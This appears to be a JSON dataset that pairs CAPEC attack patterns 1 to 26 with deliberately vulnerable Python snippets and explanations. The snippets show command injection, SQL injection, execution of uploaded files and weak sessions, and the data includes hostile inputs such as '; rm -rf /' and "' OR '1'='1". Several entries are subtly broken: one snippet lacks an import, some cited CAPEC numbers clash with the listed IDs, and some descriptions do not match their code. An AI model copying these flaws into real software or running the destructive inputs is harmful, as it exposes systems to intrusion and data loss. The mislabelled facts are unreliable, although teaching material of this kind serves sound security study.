[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated user data\nusers = {\n    'admin': {'role': 'admin', 'data': 'Sensitive admin data'},\n    'user': {'role': 'user', 'data': 'Regular user data'}\n}\n\n# Simulated ACLs\nacl = {\n    '/admin': ['admin'],\n    '/user': ['admin', 'user']\n}\n\n@app.route('/admin')\n@app.route('/user')\ndef access_resource():\n    username = request.args.get('username')\n    if username not in users:\n        return jsonify({'error': 'User not found'}), 404\n    user_role = users[username]['role']\n    if request.path not in acl or user_role not in acl[request.path]:\n        return jsonify({'error': 'Access denied'}), 403\n    return jsonify({'data': users[username]['data']})\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that simulates access control based on user roles. The application has two endpoints, '/admin' and '/user', each with different access control lists (ACLs). The ACLs specify which roles are allowed to access each endpoint. The code checks if the user is authorized to access the requested resource based on their role. If the user is not authorized, an 'Access denied' error is returned. This snippet embodies the main idea of CAPEC 'Accessing Functionality Not Properly Constrained by ACLs' by demonstrating how improper ACL configuration can lead to unauthorized access. The related CWEs provide additional context, such as incorrect default permissions (CWE-276) and improper authorization (CWE-285), which are addressed in the code by explicitly checking user roles against the ACLs."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "import time\n\nclass Account:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        self.failed_attempts = 0\n        self.locked_until = None\n\n    def authenticate(self, password):\n        if self.locked_until and time.time() < self.locked_until:\n            return 'Account is locked. Try again later.'\n        if password == self.password:\n            self.failed_attempts = 0\n            return 'Authentication successful.'\n        else:\n            self.failed_attempts += 1\n            if self.failed_attempts >= 3:\n                self.locked_until = time.time() + 60  # Lock account for 1 minute\n                return 'Account locked due to too many failed attempts.'\n            return 'Authentication failed.'\n\n# Example usage\naccount = Account('user1', 'securepassword')\nprint(account.authenticate('wrongpassword'))  # Failed attempt 1\nprint(account.authenticate('wrongpassword'))  # Failed attempt 2\nprint(account.authenticate('wrongpassword'))  # Failed attempt 3, account locked\nprint(account.authenticate('securepassword'))  # Account is locked\n",
        "description": "This Python code snippet demonstrates an overly restrictive account lockout mechanism, which is the main idea of the CAPEC 'Inducing Account Lockout'. The `Account` class has an `authenticate` method that locks the account for 1 minute after 3 failed login attempts. This mechanism can be exploited by an attacker to lock out legitimate users by repeatedly attempting to log in with incorrect passwords. The code also highlights related weaknesses such as improper restriction of excessive authentication attempts and weak password requirements."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "import re\n\ndef validate_input(user_input):\n    # Early validation before canonicalization\n    if not re.match(r'^[a-zA-Z0-9]+$', user_input):\n        return False\n    \n    # Canonicalization step\n    canonical_input = user_input.lstrip('0')  # Strips leading 'ghost' characters\n    \n    # Further processing assuming input is valid\n    return canonical_input\n\n# Example usage\nuser_input = '000123abc'\nvalidated_input = validate_input(user_input)\nif validated_input:\n    print(f'Validated and canonicalized input: {validated_input}')\nelse:\n    print('Invalid input')",
        "description": "This Python code snippet demonstrates a vulnerability where input validation is performed before canonicalization, which can be exploited by an attacker using leading 'ghost' characters. The `validate_input` function first checks if the input matches a pattern of alphanumeric characters. However, this validation occurs before the input is canonicalized by stripping leading zeros. This can allow an attacker to bypass the validation by including leading zeros, which are removed later, resulting in potentially unsafe input being processed. This example embodies the main idea of CAPEC-Using Leading 'Ghost' Character Sequences to Bypass Input Filters and highlights related CWEs such as improper input validation (CWE-20) and incorrect behavior order (CWE-180)."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "import socket\n\n# Function to check if an IP address is allowed\nallowed_ips = ['192.168.1.1', '10.0.0.1']\n\ndef is_ip_allowed(ip):\n    return ip in allowed_ips\n\n# Function to handle incoming connections\n\ndef handle_connection(client_ip):\n    try:\n        # Attempt to resolve the IP address to a hostname\n        hostname = socket.gethostbyaddr(client_ip)[0]\n        print(f'Resolved hostname: {hostname}')\n    except socket.herror:\n        print('Hostname could not be resolved')\n        return False\n\n    # Check if the IP address is allowed\n    if is_ip_allowed(client_ip):\n        print('IP address is allowed')\n        return True\n    else:\n        print('IP address is not allowed')\n        return False\n\n# Example usage\nclient_ip = '3232235777'  # Decimal representation of 192.168.1.1\nif handle_connection(client_ip):\n    print('Connection allowed')\nelse:\n    print('Connection denied')",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Using Alternative IP Address Encodings'. The code attempts to handle incoming connections by resolving the client's IP address to a hostname and checking if the IP address is in the list of allowed IPs. However, it does not properly handle alternative IP address encodings, such as the decimal representation of an IP address. This can allow an adversary to bypass access control by using an unexpected IP address format. The code also relies on reverse DNS resolution for security decisions, which can be unreliable and insecure."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "import socket\n\n# Simulate a vulnerable communication channel\nclass VulnerableCommChannel:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self):\n        self.sock.connect((self.host, self.port))\n        print('Connected to server')\n\n    def send_tone(self, tone):\n        # Improper verification of the source of the communication channel (CWE-940)\n        self.sock.sendall(tone.encode())\n        print(f'Sent tone: {tone}')\n\n    def receive_response(self):\n        response = self.sock.recv(1024)\n        print(f'Received response: {response.decode()}')\n\n# Example usage\nif __name__ == '__main__':\n    channel = VulnerableCommChannel('127.0.0.1', 12345)\n    channel.connect()\n    # Simulate sending a supervisor tone to reroute the line (Blue Boxing)\n    channel.send_tone('2600Hz')\n    channel.receive_response()",
        "description": "This Python code snippet simulates a vulnerable communication channel that embodies the main idea of the Blue Boxing attack described in the CAPEC. The `VulnerableCommChannel` class establishes a connection to a server and allows sending a tone, which represents the supervisor signal used in Blue Boxing attacks. The code demonstrates improper verification of the source of the communication channel (CWE-940), as it does not ensure that the tone is coming from an authorized source. This lack of proper authorization and verification can lead to unauthorized control over the communication line, similar to the historical Blue Boxing attacks on telephone systems."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # CWE-78: OS Command Injection\n    command = f'ls {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)\n",
        "description": "This Python code snippet demonstrates an Argument Injection vulnerability, specifically an OS Command Injection (CWE-78). The function `execute_command` takes user input and constructs an OS command without proper validation or neutralization of special elements. This allows an attacker to inject malicious commands through the `user_input` parameter. For example, if the user inputs `; rm -rf /`, it would execute the `ls` command followed by a command to delete the root directory, showcasing the potential for severe exploitation."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "import sqlite3\n\n# Vulnerable function to demonstrate Blind SQL Injection\n\ndef is_user_valid(username):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    # Improper Neutralization of Special Elements used in an SQL Command (CWE-89)\n    query = f\"SELECT 1 FROM users WHERE username = '{username}' AND password = 'password123'\"\n    cursor.execute(query)\n    result = cursor.fetchone()\n    conn.close()\n    # Incorrect Comparison (CWE-697)\n    return result is not None\n\n# Example usage\nusername_input = \"' OR '1'='1\"\nif is_user_valid(username_input):\n    print(\"User is valid\")\nelse:\n    print(\"User is invalid\")",
        "description": "This Python code snippet demonstrates a Blind SQL Injection vulnerability. The function `is_user_valid` takes a username as input and constructs an SQL query without proper neutralization of special elements (CWE-89). The query is executed against a SQLite database. An attacker can exploit this by injecting SQL code through the `username` parameter, such as `\"' OR '1'='1\"`, which always evaluates to true, bypassing authentication. The code also highlights an incorrect comparison (CWE-697) by checking if the result is not None to determine user validity. This example embodies the main idea of Blind SQL Injection as described in the CAPEC, where the lack of error messages is circumvented by probing the target with Boolean expressions."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "import ctypes\n\n# Vulnerable shared library\nlib = ctypes.CDLL('./vulnerable_lib.so')\n\n# Function prototype: void vulnerable_function(char *input)\nlib.vulnerable_function.argtypes = [ctypes.c_char_p]\n\n# Input that causes buffer overflow\ninput_data = b'A' * 1024  # Assuming the buffer in the library is smaller than 1024 bytes\n\n# Call the vulnerable function\nlib.vulnerable_function(input_data)",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability in an API call to a shared library. The code uses the ctypes library to load a shared library ('vulnerable_lib.so') and calls a function ('vulnerable_function') that is vulnerable to buffer overflow. The input data is a byte string that exceeds the expected buffer size in the library, leading to a buffer overflow. This example embodies the main idea of CAPEC-1000, 'Buffer Overflow in an API Call,' and highlights CWE-120 ('Classic Buffer Overflow') and CWE-119 ('Improper Restriction of Operations within the Bounds of a Memory Buffer'). The code does not perform any input validation or size checks, making it susceptible to exploitation."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    buffer = bytearray(64)\n    for i in range(len(user_input)):\n        buffer[i] = user_input[i]  # CWE-120: Buffer Copy without Checking Size of Input\n    os.system(buffer.decode('utf-8'))  # CWE-74: Improper Neutralization of Special Elements\n\nif __name__ == '__main__':\n    user_input = input('Enter command: ').encode('utf-8')\n    vulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a vulnerable command-line utility that can be exploited to escalate privileges. The `vulnerable_function` takes user input and copies it into a fixed-size buffer without checking if the input exceeds the buffer's size, leading to a classic buffer overflow (CWE-120). Additionally, the code uses the buffer content to construct a system command without proper neutralization of special elements (CWE-74), which can lead to command injection. This combination of vulnerabilities can be exploited by an adversary to execute arbitrary commands with elevated privileges, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "import os\n\ndef vulnerable_function():\n    buffer = bytearray(64)  # Fixed buffer size\n    env_var = os.getenv('VULNERABLE_ENV_VAR')  # Get environment variable\n    if env_var:\n        buffer[:len(env_var)] = env_var.encode('utf-8')  # Copy environment variable to buffer without size check\n    print(buffer)\n\nif __name__ == '__main__':\n    vulnerable_function()",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability via environment variables. The function `vulnerable_function` retrieves an environment variable 'VULNERABLE_ENV_VAR' and copies its content into a fixed-size buffer without checking if the environment variable's length exceeds the buffer's capacity. This can lead to a buffer overflow if the environment variable's content is larger than the buffer, potentially allowing an attacker to overwrite adjacent memory. This example embodies the CAPEC 'Buffer Overflow via Environment Variables' and highlights CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/files/<filename>')\ndef serve_file(filename):\n    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that allows file uploads and serves files from a specified directory. The main idea of the CAPEC is represented by the potential for misclassification of files based on their names or extensions. The code does not perform any validation or sanitization on the uploaded file's name or type, which can lead to several vulnerabilities described by the related CWEs. For example, an attacker could upload a file with a misleading extension to execute arbitrary code (CWE-646), or the server could incorrectly handle the file (CWE-430). Additionally, the code directly serves files from the upload directory without any checks, which could expose sensitive information (CWE-433)."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "import socket\n\nclass MulticastReceiver:\n    def __init__(self, multicast_group, port):\n        self.multicast_group = multicast_group\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.bind(('', self.port))\n        group = socket.inet_aton(self.multicast_group)\n        mreq = struct.pack('4sL', group, socket.INADDR_ANY)\n        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\n\n    def receive_message(self):\n        while True:\n            data, _ = self.sock.recvfrom(1024)\n            message = data.decode('utf-8')\n            if 'sensitive_info' in message:\n                print(f'Received sensitive information: {message}')\n            else:\n                print(f'Received message: {message}')\n\nif __name__ == '__main__':\n    receiver = MulticastReceiver('224.0.0.1', 5004)\n    receiver.receive_message()",
        "description": "This Python code snippet demonstrates a multicast receiver that listens for messages on a specified multicast group and port. The receiver decodes incoming messages and checks if they contain sensitive information. If sensitive information is found, it prints a message indicating the receipt of such information. This code embodies the CAPEC 'Choosing Message Identifier' by showing how an attacker could listen to multicast messages intended for other clients and potentially gain access to sensitive information. The code also highlights CWE-201 (Insertion of Sensitive Information Into Sent Data) by showing how sensitive information can be transmitted over a multicast channel without proper protection. Additionally, the lack of authentication (CWE-306) and improper enforcement of message integrity (CWE-924) are implied, as the receiver does not verify the authenticity or integrity of the received messages."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "import os\n\ndef authenticate_user():\n    # CWE-302: Authentication Bypass by Assumed-Immutable Data\n    user = os.getenv('USER')\n    if user == 'admin':\n        return True\n    return False\n\n# CWE-15: External Control of System or Configuration Setting\nos.environ['USER'] = 'admin'\n\nif authenticate_user():\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerability where an environment variable is subverted to bypass authentication. The `authenticate_user` function checks the `USER` environment variable to determine if the user is 'admin'. By externally setting the `USER` environment variable to 'admin', an attacker can gain unauthorized access. This embodies the CAPEC of 'Subverting Environment Variable Values' and touches on related CWEs such as CWE-302 (Authentication Bypass by Assumed-Immutable Data) and CWE-15 (External Control of System or Configuration Setting). The code highlights how improper handling of environment variables can lead to security vulnerabilities."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "import socket\n\n# Hostile service that sends malicious content\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\nprint('Hostile service running on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    # Malicious payload that causes buffer overflow\n    malicious_payload = 'A' * 1024  # CWE-120: Buffer Copy without Checking Size of Input\n    client_socket.send(malicious_payload.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a hostile service that sends a malicious payload to a client, exploiting a buffer overflow vulnerability (CAPEC: Client-side Injection-induced Buffer Overflow). The server listens on port 8080 and sends a payload of 1024 'A' characters to any connecting client. This payload is designed to overflow the buffer on the client side, demonstrating CWE-120 (Buffer Copy without Checking Size of Input). The code embodies the main idea of the CAPEC by showing how a custom-built hostile service can deliver malicious content to exploit a buffer overflow vulnerability in client software."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to command injection due to improper neutralization of special elements\n    command = f\"ls {user_input}\"\n    os.system(command)\n\n# Example usage\nuser_input = \"; rm -rf /\"  # Malicious input\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a vulnerability to command injection attacks, which is the main idea of the CAPEC 'Command Delimiters'. The function `execute_command` takes user input and concatenates it into a shell command without proper neutralization of special elements. This allows an attacker to inject malicious commands, such as `; rm -rf /`, which could lead to severe consequences like deleting the entire file system. The code embodies several related CWEs, including CWE-77 (Improper Neutralization of Special Elements used in a Command), CWE-78 (Improper Neutralization of Special Elements used in an OS Command), and CWE-140 (Improper Neutralization of Delimiters)."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "import itertools\nimport string\n\n# Simulate a dictionary of common passwords\ncommon_passwords = ['password', '123456', 'qwerty', 'abc123', 'letmein']\n\n# Simulate a user database with weak password requirements\nuser_db = {'user1': 'password', 'user2': '123456', 'user3': 'qwerty'}\n\n# Function to simulate login attempt\ndef login(username, password):\n    if username in user_db and user_db[username] == password:\n        return True\n    return False\n\n# Dictionary-based password attack\nfor username in user_db.keys():\n    for password in common_passwords:\n        if login(username, password):\n            print(f\"Login successful for {username} with password: {password}\")\n            break\n        else:\n            print(f\"Login failed for {username} with password: {password}\")",
        "description": "This Python code snippet demonstrates a dictionary-based password attack. It simulates a user database with weak password requirements (CWE-521) and attempts to log in using a list of common passwords. The `login` function checks if the provided username and password match any entry in the user database. The attack iterates over each username and tries each password from the common passwords list. If a match is found, it prints a successful login message. This code highlights the vulnerability of systems with weak password requirements and the risk of dictionary-based password attacks."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/execute/<filename>', methods=['GET'])\ndef execute_file(filename):\n    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    if not os.path.exists(file_path):\n        return 'File not found', 404\n    os.system(file_path)\n    return 'File executed', 200\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application using the Flask framework. The application allows users to upload files to a specified directory and then execute those files via a web request. The main idea of the CAPEC 'Using Malicious Files' is embodied here, as the application does not properly validate or sanitize the uploaded files, nor does it enforce strict permissions or ownership checks (CWE-732, CWE-282). Additionally, the code does not perform proper authorization checks (CWE-285) and runs the uploaded files with potentially elevated privileges (CWE-272, CWE-270). This creates a significant security risk, as an attacker could upload and execute malicious files on the server."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/display', methods=['GET'])\ndef display():\n    user_input = request.args.get('input', '')\n    # Vulnerable code: directly embedding user input in an IMG tag without proper sanitization\n    html_content = f'<img src=\"{user_input}\" alt=\"User Image\">'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to XSS attacks targeting non-script elements, specifically the IMG tag. The application takes user input from a query parameter 'input' and directly embeds it into the 'src' attribute of an IMG tag without proper sanitization or validation. This can allow an attacker to inject malicious scripts through the 'src' attribute, leading to a Cross-Site Scripting (XSS) attack. The code embodies the main idea of CAPEC-139 (XSS Targeting Non-Script Elements) and highlights related CWEs such as CWE-80, CWE-82, and CWE-79 by showing improper neutralization of user input in a web page."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\n# CWE-506: Embedded Malicious Code\n# CWE-830: Inclusion of Web Functionality from an Untrusted Source\n# CWE-79: Cross-site Scripting (XSS)\n\n# Simulate a vulnerable function that executes scripts from an untrusted source\n\ndef execute_script(script_path):\n    if not os.path.exists(script_path):\n        raise FileNotFoundError(f\"Script {script_path} not found.\")\n    with open(script_path, 'r') as file:\n        script_content = file.read()\n        # CWE-79: Vulnerable to XSS if script_content is user-controlled\n        exec(script_content)  # CWE-506: Potentially executing malicious code\n\n# Example of embedding a malicious script within another script\ntrusted_script = \"trusted_script.py\"\nmalicious_script = \"malicious_script.py\"\n\n# Create a trusted script\nwith open(trusted_script, 'w') as file:\n    file.write(\"print('This is a trusted script.')\\n\")\n\n# Embed malicious code within the trusted script\nwith open(malicious_script, 'w') as file:\n    file.write(\"print('This is a malicious script.')\\n\")\n    file.write(\"exec(open('trusted_script.py').read())\\n\")  # CWE-830: Including functionality from an untrusted source\n\n# Execute the malicious script\nexecute_script(malicious_script)",
        "description": "This Python code snippet demonstrates a scenario where an adversary embeds a malicious script within another script that the target software is likely to execute. The `execute_script` function is vulnerable to CWE-284 (Improper Access Control) as it does not properly restrict access to the script execution. It also demonstrates CWE-506 (Embedded Malicious Code) by potentially executing harmful code. CWE-830 (Inclusion of Web Functionality from an Untrusted Source) is shown by including and executing content from another script file. Finally, CWE-79 (Cross-site Scripting) is implied as the script content could be user-controlled and improperly neutralized. The code creates a trusted script and a malicious script that embeds the trusted script, then executes the malicious script, illustrating the embedding of scripts within scripts."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "import itertools\nfrom Crypto.Cipher import AES\n\n# Hard-coded key (CWE-321)\nkey = b'weakkey123456789'  # 16 bytes key for AES-128\n\n# Example cipher text (encrypted with the above key)\ncipher_text = b'\\x8b\\xad\\xf0\\x1d\\x7f\\x8e\\x9a\\x1b\\x8b\\x1d\\x7f\\x8e\\x9a\\x1b\\x8b\\x1d'\n\n# Brute force attack on the key space (CAPEC-116)\nfor attempt in itertools.product(range(256), repeat=16):\n    attempt_key = bytes(attempt)\n    cipher = AES.new(attempt_key, AES.MODE_ECB)\n    try:\n        plain_text = cipher.decrypt(cipher_text)\n        if b'secret' in plain_text:  # Assuming we know part of the plaintext\n            print(f'Key found: {attempt_key}')\n            print(f'Plaintext: {plain_text}')\n            break\n    except ValueError:\n        continue",
        "description": "This Python code snippet demonstrates a brute force attack on an AES-encrypted cipher text using a hard-coded key (CWE-321). The code iterates through all possible 16-byte keys (256^16 combinations) to find the correct key that decrypts the cipher text to a known plaintext. This embodies the main idea of CAPEC-116 (Encryption Brute Forcing) by performing an exhaustive search on the key space. The use of a weak, hard-coded key and the assumption of a known plaintext make the encryption vulnerable to brute force attacks."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n# CWE-539: Use of Persistent Cookies Containing Sensitive Information\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if authenticate(username, password):\n        # CWE-6: Insufficient Session-ID Length\n        session_id = hashlib.md5(username.encode()).hexdigest()\n        resp = make_response('Logged in')\n        # CWE-539: Persistent cookie with sensitive information\n        resp.set_cookie('session_id', session_id, max_age=60*60*24*30)  # 30 days\n        return resp\n    return 'Login failed', 401\n\n# CWE-346: Origin Validation Error\n@app.route('/protected')\ndef protected():\n    session_id = request.cookies.get('session_id')\n    if not session_id or not validate_session(session_id):\n        return 'Access denied', 403\n    return 'Protected content'\n\n# CWE-384: Session Fixation\n@app.route('/change_password', methods=['POST'])\ndef change_password():\n    session_id = request.cookies.get('session_id')\n    if not session_id or not validate_session(session_id):\n        return 'Access denied', 403\n    new_password = request.form['new_password']\n    # Change password logic here\n    return 'Password changed'\n\n# Dummy authentication and session validation functions\ndef authenticate(username, password):\n    return username == 'admin' and password == 'password'\n\ndef validate_session(session_id):\n    return session_id == hashlib.md5('admin'.encode()).hexdigest()\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. It embodies the main idea of CAPEC-111: Exploitation of Trusted Identifiers. The code includes several related CWEs:\n\n1. CWE-539: The application uses persistent cookies to store sensitive information (session ID) for 30 days.\n2. CWE-6: The session ID is generated using an insufficient length (MD5 hash of the username).\n3. CWE-346: The application does not properly validate the origin of the session ID.\n4. CWE-384: The application does not invalidate the session ID when changing the password, leading to session fixation.\n\nThe code demonstrates how an attacker could exploit these weaknesses to perform authorized actions under the guise of an authenticated user."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} has been established.')\n    client_socket.send(bytes('Welcome to the server!', 'utf-8'))\n    data = client_socket.recv(1024)\n    print(f'Received data: {data.decode('utf-8')}')\n    client_socket.close()",
        "description": "This Python code snippet represents a simple server that accepts connections from clients without proper authentication or input validation. The server implicitly trusts any client that connects, which is a key aspect of the 'Exploiting Trust in Client' CAPEC. The server does not verify the identity of the client (CWE-287: Improper Authentication) and does not validate the received data (CWE-20: Improper Input Validation). This lack of security measures can lead to various attacks, such as spoofing (CWE-290: Authentication Bypass by Spoofing) and exposure of sensitive information (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor). The code demonstrates how an attacker could exploit these weaknesses by simply connecting to the server and sending data, which the server blindly trusts and processes."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "import os\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-20: Improper Input Validation\n\ndef save_file(file_path, content):\n    # CWE-646: Relying on file extension to determine file type\n    if not file_path.endswith('.txt'):\n        raise ValueError('Only .txt files are allowed')\n\n    # CWE-20: No proper validation of file content\n    with open(file_path, 'w') as file:\n        file.write(content)\n\n# CWE-434: Unrestricted upload of file with dangerous type\nuploaded_file_path = 'uploads/malicious.exe'\nmalicious_content = 'This is a malicious payload'\n\n# Saving the file without proper validation\nsave_file(uploaded_file_path, malicious_content)\n\n# CWE-433: Unparsed Raw Web Content Delivery\n# Serving the uploaded file directly\nos.system(f'cat {uploaded_file_path}')",
        "description": "This Python code snippet demonstrates a vulnerable file upload and handling process. The `save_file` function allows saving files with a specific extension (.txt), but it does not properly validate the file content (CWE-20). The function also relies on the file extension to determine the file type (CWE-646). An attacker can exploit this by uploading a file with a dangerous type (CWE-434), such as an executable file, which is then saved without proper validation. The code also includes a command to serve the uploaded file directly, representing CWE-433 (Unparsed Raw Web Content Delivery). This snippet embodies the main idea of CAPEC-176 (File Content Injection) by demonstrating how an adversary can inject malicious content into files and exploit the system's trust in executing remote content."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "def vulnerable_filter(input_string):\n    buffer = [''] * 10  # Fixed-size buffer\n    for i in range(len(input_string)):\n        buffer[i] = input_string[i]  # No bounds checking\n    return ''.join(buffer)\n\n# Example usage\nuser_input = 'A' * 20  # Overly long input\nprint(vulnerable_filter(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable filter function that attempts to copy an input string into a fixed-size buffer without performing proper bounds checking. The buffer is defined with a fixed size of 10 elements, but the function does not check if the input string exceeds this size. As a result, if an attacker provides an overly long input string (e.g., 20 characters), it will cause a buffer overflow. This embodies the main idea of the CAPEC 'Filter Failure through Buffer Overflow' by showing how an oversized transaction can overwhelm the filter, potentially leading to unfiltered input being processed. The code also touches on related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "import threading\n\n# Shared resource\nshared_resource = 0\n\n# Locks\nlock1 = threading.Lock()\nlock2 = threading.Lock()\n\n# Thread 1 function\ndef thread1_func():\n    global shared_resource\n    with lock1:\n        print('Thread 1 acquired lock1')\n        with lock2:\n            print('Thread 1 acquired lock2')\n            shared_resource += 1\n            print('Thread 1 incremented shared_resource')\n\n# Thread 2 function\ndef thread2_func():\n    global shared_resource\n    with lock2:\n        print('Thread 2 acquired lock2')\n        with lock1:\n            print('Thread 2 acquired lock1')\n            shared_resource += 1\n            print('Thread 2 incremented shared_resource')\n\n# Create threads\nthread1 = threading.Thread(target=thread1_func)\nthread2 = threading.Thread(target=thread2_func)\n\n# Start threads\nthread1.start()\nthread2.start()\n\n# Wait for threads to complete\nthread1.join()\nthread2.join()\n\nprint('Final value of shared_resource:', shared_resource)",
        "description": "This Python code snippet demonstrates a forced deadlock scenario, which is the main idea of the CAPEC. The code uses two threads that attempt to acquire two locks in different orders, leading to a deadlock condition. Thread 1 acquires lock1 and then tries to acquire lock2, while Thread 2 acquires lock2 and then tries to acquire lock1. Since each thread is holding one lock and waiting for the other, neither thread can proceed, resulting in a deadlock. This example also touches on related CWEs such as 'Improper Locking' (CWE-667) and 'Deadlock' (CWE-833)."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "import os\nimport threading\nimport time\n\n# Shared resource\nfile_path = 'shared_file.txt'\n\n# Function to write to the file\ndef write_to_file():\n    with open(file_path, 'w') as f:\n        f.write('Original content')\n    time.sleep(1)  # Simulate delay\n    with open(file_path, 'w') as f:\n        f.write('Modified content')\n\n# Function to read from the file\ndef read_from_file():\n    time.sleep(0.5)  # Ensure this runs between the writes\n    with open(file_path, 'r') as f:\n        content = f.read()\n    print(f'Read content: {content}')\n\n# Create threads\nwriter_thread = threading.Thread(target=write_to_file)\nreader_thread = threading.Thread(target=read_from_file)\n\n# Start threads\nwriter_thread.start()\nreader_thread.start()\n\n# Wait for threads to complete\nwriter_thread.join()\nreader_thread.join()",
